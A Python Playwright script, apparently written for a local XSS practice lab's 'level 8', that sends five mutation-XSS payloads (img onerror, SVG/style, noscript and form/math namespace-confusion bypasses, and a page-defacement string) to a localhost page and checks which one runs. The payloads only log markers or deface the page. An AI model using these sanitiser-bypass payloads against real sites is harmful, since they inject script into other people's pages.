#!/usr/bin/env python3
"""
Test XSS Level 8 - mXSS (Mutation XSS)
Input escapado pero inyectado via innerHTML = mutation possible
"""
import asyncio
from playwright.async_api import async_playwright
import urllib.parse

async def test_level8():
    print("\n🎯 Test XSS Level 8 - mXSS (Mutation XSS)\n")
    print("="*60)
    
    # Payloads mXSS - se mutan después de innerHTML
    payloads = [
        # Básico
        "<img src=x onerror=console.log('mXSS_BASIC')>",
        
        # SVG + style mutation
        "<svg><style><img src=x onerror=console.log('mXSS_SVG_STYLE')>",
        
        # Noscript mutation
        "<noscript><p title=\"</noscript><img src=x onerror=console.log('mXSS_NOSCRIPT')\">",
        
        # Form Math mutation (complejo)
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=console.log('mXSS_MATH')>",
        
        # Visual defacement para PoE
        "<img src=x onerror=\"var b=document.createElement('div');b.id='bt-pwn-l8';b.innerText='MXSS DETECTED';document.body.prepend(b)\">",
    ]
    
    base_url = "http://127.0.0.1:5090/xss/level8"
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}/{len(payloads)}] Testing: {payload[:50]}...")
            
            page = await browser.new_page()
            
            # Console logs
            logs = []
            page.on("console", lambda msg: logs.append(msg.text))
            
            try:
                url = f"{base_url}?q={urllib.parse.quote(payload)}"
                await page.goto(url, wait_until="load", timeout=8000)
                await asyncio.sleep(2)
                
                # Verificar ejecución
                html = await page.content()
                
                # Buscar markers
                if "mXSS" in str(logs) or "MXSS DETECTED" in html:
                    print(f"  ✅ ¡mXSS EJECUTADO!")
                    print(f"     Logs: {[log for log in logs if 'mXSS' in log or 'MXSS' in log]}")
                    
                    # Verificar DOM marker si es visual defacement
                    if "bt-pwn-l8" in payload:
                        marker = await page.query_selector("#bt-pwn-l8")
                        if marker:
                            print(f"     DOM Marker: #bt-pwn-l8 confirmado")
                    
                    await page.screenshot(path=f"/tmp/level8_success_{i}.png")
                    print(f"     Screenshot: /tmp/level8_success_{i}.png")
                    
                    await page.close()
                    await browser.close()
                    
                    print("\n" + "="*60)
                    print("🎉 LEVEL 8 mXSS CONFIRMADO!")
                    print(f"Payload ganador: {payload}")
                    return True
                else:
                    print(f"  ❌ No ejecutado")
                    # Debug
                    if "safe" in html:
                        safe_div = html[html.find('id="safe"'):html.find('id="safe"')+300]
                        print(f"     Safe div: {safe_div[:100]}")
                
            except Exception as e:
                print(f"  ⚠️ Error: {e}")
            finally:
                await page.close()
        
        await browser.close()
    
    print("\n" + "="*60)
    print("❌ Ningún payload mXSS funcionó")
    return False

if __name__ == "__main__":
    result = asyncio.run(test_level8())
    exit(0 if result else 1)
